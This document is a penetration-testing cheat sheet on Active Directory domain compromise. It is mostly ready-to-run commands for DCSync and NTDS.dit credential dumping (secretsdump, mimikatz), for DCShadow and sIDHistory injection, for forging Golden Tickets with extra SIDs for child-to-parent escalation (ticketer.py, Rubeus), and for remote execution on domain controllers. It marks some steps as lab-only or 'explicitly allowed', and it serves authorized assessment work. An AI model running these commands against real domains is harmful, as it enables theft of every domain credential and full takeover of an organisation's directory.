# Domain Compromise

Domain compromise means gaining control over domain-level authentication, replication, privileged groups, domain controllers, trust relationships, or key material such as `krbtgt`.

This is the highest-impact stage in an Active Directory assessment.

Typical domain compromise indicators:

- ability to DCSync
- ability to dump `NTDS.dit`
- control over a Domain Admin or equivalent account
- control over `krbtgt`
- control over a domain controller
- ability to forge valid Kerberos tickets
- ability to compromise parent or trusted domains
- ability to abuse inter-domain or inter-forest trusts

Useful resources:

- [The Hacker Recipes - DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
- [The Hacker Recipes - Golden Ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden)
- [The Hacker Recipes - Trusts](https://www.thehacker.recipes/ad/movement/trusts/)
- [The Hacker Recipes - Dumping NTDS.dit](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)
- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [Impacket](https://github.com/fortra/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [WADComs](https://wadcoms.github.io/)

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export NTLM='8846f7eaee8fb117ad06bdd830b7586c'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export DOMAIN_DN='DC=corp,DC=local'
export DOMAIN_SID='S-1-5-21-1111111111-2222222222-3333333333'
export PARENT_DOMAIN=corp.local
export CHILD_DOMAIN=dev.corp.local
export CHILD_SID='S-1-5-21-4444444444-5555555555-6666666666'
export PARENT_SID='S-1-5-21-1111111111-2222222222-3333333333'
```

## DCSync

DCSync abuses Active Directory replication permissions.

A principal with the right replication permissions can ask a domain controller to replicate password data for domain accounts.

Required rights commonly include:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

Sometimes this is also relevant:

```text
DS-Replication-Get-Changes-In-Filtered-Set
```

Common principals that normally have replication capability:

| Principal | Notes |
| --- | --- |
| Domain Controllers | Replicate directory data. |
| Domain Admins | Usually have sufficient control. |
| Enterprise Admins | Forest-level high privilege. |
| Administrators | Built-in privileged context. |
| Custom delegated accounts | Dangerous if replication rights were delegated. |

Check DCSync-related ACLs with PowerView:

```powershell
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -match "Replication"
}
```

Find replication rights in BloodHound:

```text
GetChanges
GetChangesAll
GetChangesInFilteredSet
DCSync
```

Validate DCSync against one account:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
```

With NT hash:

```bash
secretsdump.py $DOMAIN/$USER@$DC_IP -hashes :$NTLM -just-dc-user krbtgt
```

Dump one specific user:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user Administrator
```

Dump domain secrets in a lab when explicitly allowed:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc
```

Use Kerberos ticket:

```bash
export KRB5CCNAME=$PWD/admin.ccache
secretsdump.py -k -no-pass $DOMAIN/Administrator@$DC_HOST -just-dc-user krbtgt
```

Mimikatz DCSync:

```cmd
mimikatz.exe
lsadump::dcsync /domain:corp.local /user:krbtgt
```

DCSync for Administrator:

```cmd
lsadump::dcsync /domain:corp.local /user:Administrator
```

Useful output:

| Output | Meaning |
| --- | --- |
| NT hash | Used for Pass-the-Hash or Kerberos RC4 key material. |
| AES128/AES256 keys | Kerberos key material. |
| LM hash | Usually disabled or empty-equivalent in modern environments. |
| Supplemental credentials | Additional credential material. |
| krbtgt hash | Enables Golden Ticket paths. |

Common errors:

| Error | Meaning |
| --- | --- |
| `rpc_s_access_denied` | Missing replication rights. |
| `STATUS_ACCESS_DENIED` | Account lacks required permissions. |
| Connection error | RPC/SMB/DC connectivity issue. |
| Kerberos error | DNS, SPN, time, or ticket issue. |

## DCShadow

DCShadow abuses replication behavior by registering a rogue domain controller-like replication source and pushing changes into AD.

This is an advanced domain-compromise technique and normally requires very high privileges.

Typical requirements:

| Requirement | Notes |
| --- | --- |
| Domain Admin or equivalent | Needed for DCShadow setup and replication abuse. |
| Ability to modify AD configuration | Rogue DC registration path. |
| Network access to DCs | Replication communication. |
| Mimikatz or equivalent tooling | Common tool for DCShadow. |

Common use cases in labs:

| Use case | Example |
| --- | --- |
| Modify an attribute | Add or change an AD attribute. |
| Modify `sIDHistory` | Add privileged SID history. |
| Modify AdminSDHolder-related data | Persistence path. |
| Push stealthier changes | Replication-style modification. |

Mimikatz command structure:

```cmd
mimikatz.exe
privilege::debug
lsadump::dcshadow /object:CN=TargetUser,CN=Users,DC=corp,DC=local /attribute:description /value:"test"
lsadump::dcshadow /push
```

Example modifying `sIDHistory` in a lab:

```cmd
lsadump::dcshadow /object:CN=TargetUser,CN=Users,DC=corp,DC=local /attribute:sIDHistory /value:S-1-5-21-1111111111-2222222222-3333333333-512
lsadump::dcshadow /push
```

Check result with LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(sAMAccountName=TargetUser)" \
sAMAccountName description sIDHistory
```

PowerView check:

```powershell
Get-DomainUser -Identity TargetUser -Properties sidhistory,description
```

DCShadow indicators:

| Indicator | Meaning |
| --- | --- |
| Rogue DC registration activity | DCShadow setup behavior. |
| Replication metadata changes | Attribute modification via replication path. |
| Unexpected `sIDHistory` | Possible privilege injection. |
| Changes not matching normal admin tools | Suspicious modification path. |

## Domain Admin

Domain Admin control is a common domain-compromise milestone.

Domain Admins normally have administrative control over domain-joined systems and domain controllers.

Check Domain Admin membership:

```bash
net rpc group members "Domain Admins" -U "$NETBIOS/$USER%$PASS" -S $DC_IP
```

PowerView:

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

AD module:

```powershell
Get-ADGroupMember "Domain Admins" -Recursive
```

Check if current user is Domain Admin:

```cmd
whoami /groups
```

Validate privileged SMB access to DC:

```bash
nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN
nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN --shares
```

Validate WinRM where enabled:

```bash
nxc winrm $DC_IP -u $USER -p "$PASS" -d $DOMAIN
```

Validate DCSync:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
```

Validate remote command execution only when explicitly allowed:

```bash
wmiexec.py $DOMAIN/$USER:"$PASS"@$DC_IP "whoami"
```

Common ways Domain Admin is reached:

| Path | Example |
| --- | --- |
| Group membership abuse | Add user to Domain Admins. |
| Password reset | Take over existing Domain Admin. |
| Credential dumping | Extract Domain Admin hash/ticket. |
| Kerberoasting | Crack privileged service account. |
| ACL abuse | WriteDACL, GenericAll, AddMember path. |
| AD CS abuse | Certificate authentication as privileged user. |
| Session hijacking/ticket theft | Admin session on controlled host. |
| Backup system compromise | Restore/extract high-value secrets. |

Domain Admin does not always mean Enterprise Admin. In multi-domain forests, validate exact scope.

## Enterprise Admin

Enterprise Admin is a forest-level privileged group.

It exists in the forest root domain and can affect all domains in the forest.

Check forest:

```powershell
Get-ADForest
```

PowerView:

```powershell
Get-Forest
Get-ForestDomain
```

Check Enterprise Admins:

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain corp.local -Recurse
```

AD module:

```powershell
Get-ADGroupMember "Enterprise Admins" -Recursive
```

LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(&(objectClass=group)(cn=Enterprise Admins))" member
```

Validate forest root context:

```cmd
nltest /domain_trusts
nltest /dclist:corp.local
```

Enterprise Admin impact:

| Capability | Notes |
| --- | --- |
| Forest-wide administrative control | High-impact across domains. |
| Cross-domain privilege | Can affect child domains. |
| Schema-level access path | Often close to Schema Admin capability. |
| Trust and domain management | Forest administration context. |

Common paths to Enterprise Admin:

| Path | Example |
| --- | --- |
| Compromise forest root Domain Admin | Add or control Enterprise Admins. |
| Child-to-parent abuse | Extra SID / trust abuse path. |
| Trust key compromise | Inter-realm ticket path. |
| Admin session theft | Enterprise Admin logged into compromised host. |
| AD CS or ACL path | Privileged certificate or object control path. |

## Trust Abuse

Trust abuse targets authentication and authorization relationships between domains or forests.

Enumerate trusts:

```cmd
nltest /domain_trusts
```

PowerView:

```powershell
Get-DomainTrust
Get-DomainTrustMapping
Get-ForestTrust
Get-ForestDomain
```

AD module:

```powershell
Get-ADTrust -Filter *
Get-ADForest
```

LDAP trusted domain objects:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=System,$DOMAIN_DN" "(objectClass=trustedDomain)" \
cn trustPartner trustDirection trustType trustAttributes flatName securityIdentifier
```

Important trust properties:

| Property | Meaning |
| --- | --- |
| Direction | Inbound, outbound, or bidirectional. |
| Transitivity | Whether trust extends beyond direct trust. |
| Trust type | Parent-child, tree-root, external, forest. |
| SID filtering | Affects SID-based abuse. |
| Selective authentication | Limits cross-trust access. |
| Trust attributes | Flags describing trust behavior. |

Direction reminder:

| Direction | Meaning |
| --- | --- |
| Inbound | Other domain trusts users from this domain. |
| Outbound | This domain trusts users from the other domain. |
| Bidirectional | Both domains trust each other. |

Dump trust account secrets if DCSync/domain compromise is available:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc
```

Look for trust accounts:

```text
TRUSTEDDOMAIN$
CHILDDOMAIN$
PARENTDOMAIN$
```

Mimikatz trust key extraction on DC in lab:

```cmd
mimikatz.exe
lsadump::trust /patch
```

Inter-realm ticket abuse depends on trust direction, trust keys, SID filtering, and target access.

Trust abuse targets:

| Target | Notes |
| --- | --- |
| Parent domain | Common child-to-parent escalation target. |
| Child domain | Movement from parent to child. |
| External domain | Depends on trust scope and SID filtering. |
| Forest trust | Depends on selective authentication and forest settings. |
| Resource domain | Access depends on ACLs and group membership. |

## Child to Parent

Child-to-parent compromise targets escalation from a child domain to the forest root or parent domain.

A classic lab path uses:

```text
Child domain compromise
Child krbtgt key
Child domain SID
Parent domain SID
Extra SID: Enterprise Admins or parent privileged group SID
Forged ticket with extra SID
Access to parent domain resources
```

Required information:

| Item | Example |
| --- | --- |
| Child domain | `dev.corp.local` |
| Parent domain | `corp.local` |
| Child SID | `S-1-5-21-4444-5555-6666` |
| Parent SID | `S-1-5-21-1111-2222-3333` |
| Parent Enterprise Admins SID | `PARENT_SID-519` |
| Child `krbtgt` hash/key | From DCSync in child domain. |

Get child domain SID:

```powershell
Get-DomainSID -Domain dev.corp.local
```

Get parent domain SID:

```powershell
Get-DomainSID -Domain corp.local
```

Linux with lookupsid:

```bash
lookupsid.py $CHILD_DOMAIN/$USER:"$PASS"@$DC_IP
```

Dump child `krbtgt`:

```bash
secretsdump.py $CHILD_DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
```

Create Golden Ticket with extra SID:

```bash
ticketer.py -nthash CHILD_KRBTGT_NT_HASH \
-domain-sid $CHILD_SID \
-domain $CHILD_DOMAIN \
-extra-sid ${PARENT_SID}-519 \
Administrator
```

Use ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
```

Access parent DC:

```bash
wmiexec.py -k -no-pass $CHILD_DOMAIN/Administrator@parentdc.corp.local
```

Alternative access validation:

```bash
secretsdump.py -k -no-pass $CHILD_DOMAIN/Administrator@parentdc.corp.local -just-dc-user krbtgt
```

Mimikatz Golden Ticket with extra SID:

```cmd
mimikatz.exe
kerberos::golden /user:Administrator /domain:dev.corp.local /sid:CHILD_DOMAIN_SID /krbtgt:CHILD_KRBTGT_HASH /sids:PARENT_DOMAIN_SID-519 /ptt
```

Common extra SIDs:

| SID suffix | Meaning |
| --- | --- |
| `-519` | Enterprise Admins. |
| `-512` | Domain Admins. |
| `-518` | Schema Admins. |
| `-520` | Group Policy Creator Owners. |

Common blockers:

| Blocker | Effect |
| --- | --- |
| SID filtering | Extra SID abuse may fail. |
| Wrong SID | Ticket works incorrectly or access denied. |
| Wrong krbtgt key | Ticket invalid. |
| DNS/SPN mismatch | Kerberos access fails. |
| Time skew | Kerberos ticket rejected. |

## SID History

`sIDHistory` allows an account to carry previous SIDs after migration.

It can be abused if an attacker can add privileged SIDs to an account.

Search for SID history:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(sIDHistory=*)" \
sAMAccountName objectSid sIDHistory
```

PowerView:

```powershell
Get-DomainUser -LDAPFilter "(sIDHistory=*)" -Properties sidhistory
Get-DomainObject -LDAPFilter "(sIDHistory=*)"
```

Common privileged SIDs:

| SID | Meaning |
| --- | --- |
| `DOMAIN_SID-512` | Domain Admins. |
| `DOMAIN_SID-519` | Enterprise Admins. |
| `DOMAIN_SID-518` | Schema Admins. |
| `DOMAIN_SID-500` | Built-in Administrator account. |

Golden Ticket with extra SID using Impacket:

```bash
ticketer.py -nthash KRBTGT_NT_HASH \
-domain-sid $DOMAIN_SID \
-domain $DOMAIN \
-extra-sid ${DOMAIN_SID}-512 \
Administrator
```

Mimikatz extra SID:

```cmd
kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /sids:DOMAIN_SID-512 /ptt
```

DCShadow can also be used in labs to push `sIDHistory` changes if the required high privileges are available:

```cmd
lsadump::dcshadow /object:CN=TargetUser,CN=Users,DC=corp,DC=local /attribute:sIDHistory /value:S-1-5-21-1111111111-2222222222-3333333333-512
lsadump::dcshadow /push
```

Validate token/group effect:

```cmd
whoami /groups
```

Kerberos validation:

```cmd
klist
```

Common issues:

| Issue | Meaning |
| --- | --- |
| SID filtering | Cross-domain SID may be filtered. |
| Token not refreshed | Logon or ticket refresh needed. |
| Wrong SID suffix | Privilege not granted. |
| DCShadow failed | Replication-style modification did not apply. |

## KRBTGT

The `krbtgt` account is the Kerberos Ticket Granting Ticket service account for the domain.

Its key material is used to sign and encrypt TGTs.

If the `krbtgt` hash or AES key is compromised, an attacker can forge TGTs such as Golden Tickets.

Dump `krbtgt` with DCSync:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
```

With Kerberos:

```bash
export KRB5CCNAME=$PWD/admin.ccache
secretsdump.py -k -no-pass $DOMAIN/Administrator@$DC_HOST -just-dc-user krbtgt
```

Mimikatz:

```cmd
mimikatz.exe
lsadump::dcsync /domain:corp.local /user:krbtgt
```

Important `krbtgt` material:

| Material | Use |
| --- | --- |
| NT hash / RC4 key | Golden Ticket with RC4. |
| AES128 key | Kerberos ticket forging with AES128. |
| AES256 key | Kerberos ticket forging with AES256. |
| Password history | Old tickets may validate during rotation window. |

Create Golden Ticket with Impacket:

```bash
ticketer.py -nthash KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
```

With AES:

```bash
ticketer.py -aesKey KRBTGT_AES256_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
```

Use ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
```

Validate:

```bash
wmiexec.py -k -no-pass $DOMAIN/Administrator@$DC_HOST
```

Mimikatz Golden Ticket:

```cmd
kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /groups:512,513,518,519,520 /ptt
```

Rubeus Golden Ticket:

```powershell
Rubeus.exe golden /rc4:KRBTGT_NT_HASH /user:Administrator /domain:corp.local /sid:DOMAIN_SID /id:500 /groups:512,513,518,519,520 /ptt
```

Operationally important facts:

| Fact | Meaning |
| --- | --- |
| `krbtgt` is domain-specific | One domain's `krbtgt` does not automatically control another domain. |
| Two rotations are commonly needed | Old and current keys may both be accepted during transition. |
| Forged tickets can outlive passwords | Ticket lifetime and validation behavior matter. |
| AES keys are preferred in modern domains | RC4 may be disabled or monitored. |

## NTDS Dumping

`NTDS.dit` is the Active Directory database on domain controllers.

It contains directory data, including password-related material for domain accounts.

Common NTDS dumping methods:

| Method | Notes |
| --- | --- |
| DRSUAPI / DCSync | Remote replication method. |
| VSS | Volume Shadow Copy extraction. |
| IFM | `ntdsutil` Install From Media copy. |
| Offline copy | Extract `NTDS.dit` and SYSTEM hive from disk/backup. |
| Backup restore | Extract from DC backup if authorized. |

Remote DCSync-style dump with Impacket:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc
```

Dump only NTLM hashes:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-ntlm
```

Dump one user:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user Administrator
```

VSS method with Impacket if the account has required rights:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -use-vss
```

With hash:

```bash
secretsdump.py $DOMAIN/$USER@$DC_IP -hashes :$NTLM -use-vss
```

Create IFM copy on DC in a lab:

```cmd
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ntds_ifm" quit quit
```

Save registry hives:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
reg save HKLM\SAM C:\Windows\Temp\SAM
```

Common NTDS paths:

```text
C:\Windows\NTDS\NTDS.dit
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\System32\config\SAM
```

Offline parsing with secretsdump:

```bash
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```

With SECURITY hive:

```bash
secretsdump.py -ntds NTDS.dit -system SYSTEM -security SECURITY LOCAL
```

Copy from admin share if available and in scope:

```bash
smbclient //$DC_IP/C$ -U "$DOMAIN/$USER%$PASS"
```

Typical artifacts:

| Artifact | Purpose |
| --- | --- |
| `NTDS.dit` | AD database. |
| `SYSTEM` | Bootkey needed to decrypt secrets. |
| `SECURITY` | LSA secrets. |
| `SAM` | Local account hashes. |
| IFM directory | Safer exported NTDS copy. |
| VSS snapshot | Snapshot-based extraction source. |

Common errors:

| Error | Meaning |
| --- | --- |
| File locked | Direct copy of live NTDS failed. Use VSS/IFM. |
| Access denied | Missing DC admin/backup privileges. |
| Decryption fails | Missing or wrong SYSTEM hive. |
| Network interruption | Large dump/copy failed. |
| EDR interference | Tooling blocked or quarantined. |

## Domain Compromise Checklist

- [ ] **Confirm current privilege level**

  ```cmd
  whoami
  whoami /groups
  ```

  ```bash
  nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
  ```

- [ ] **Confirm domain, forest, and DC context**

  ```powershell
  Get-ADDomain
  Get-ADForest
  Get-ADDomainController -Filter *
  ```

  ```cmd
  nltest /domain_trusts
  nltest /dclist:corp.local
  ```

- [ ] **Check Domain Admin control**

  ```powershell
  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
  ```

  ```bash
  nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN --shares
  ```

- [ ] **Check Enterprise Admin control**

  ```powershell
  Get-DomainGroupMember -Identity "Enterprise Admins" -Domain corp.local -Recurse
  Get-ForestDomain
  ```

- [ ] **Validate DCSync rights against one account**

  ```bash
  secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
  ```

- [ ] **Dump `krbtgt` only when explicitly allowed**

  ```bash
  secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
  ```

- [ ] **Dump domain secrets only when explicitly allowed**

  ```bash
  secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc
  ```

- [ ] **Create and validate Golden Ticket in lab if `krbtgt` is available**

  ```bash
  ticketer.py -nthash KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
  export KRB5CCNAME=$PWD/Administrator.ccache
  klist
  ```

- [ ] **Check trust relationships**

  ```powershell
  Get-DomainTrust
  Get-DomainTrustMapping
  Get-ForestTrust
  ```

  ```bash
  ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
  -b "CN=System,$DOMAIN_DN" "(objectClass=trustedDomain)" \
  cn trustPartner trustDirection trustType trustAttributes
  ```

- [ ] **Check child-to-parent path if operating from a child domain**

  ```bash
  secretsdump.py $CHILD_DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
  ```

  ```bash
  ticketer.py -nthash CHILD_KRBTGT_NT_HASH \
  -domain-sid $CHILD_SID \
  -domain $CHILD_DOMAIN \
  -extra-sid ${PARENT_SID}-519 \
  Administrator
  ```

- [ ] **Check SID history**

  ```bash
  ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
  -b "$DOMAIN_DN" "(sIDHistory=*)" \
  sAMAccountName objectSid sIDHistory
  ```

- [ ] **Check NTDS dumping options**

  ```bash
  secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -use-vss
  ```

  ```cmd
  ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ntds_ifm" quit quit
  ```

- [ ] **Check DCShadow only in controlled labs**

  ```cmd
  mimikatz.exe
  privilege::debug
  lsadump::dcshadow /object:CN=TargetUser,CN=Users,DC=corp,DC=local /attribute:description /value:"test"
  lsadump::dcshadow /push
  ```

- [ ] **Validate ticket-based access**

  ```bash
  export KRB5CCNAME=$PWD/Administrator.ccache
  klist
  wmiexec.py -k -no-pass $DOMAIN/Administrator@$DC_HOST
  ```

- [ ] **Validate replication or DC access impact**

  ```bash
  secretsdump.py -k -no-pass $DOMAIN/Administrator@$DC_HOST -just-dc-user krbtgt
  ```

- [ ] **Keep artifacts separated**

  ```text
  DCSync output
  krbtgt material
  Golden Ticket ccache/kirbi
  NTDS.dit
  SYSTEM hive
  Trust keys
  SID data
  Command output
  ```
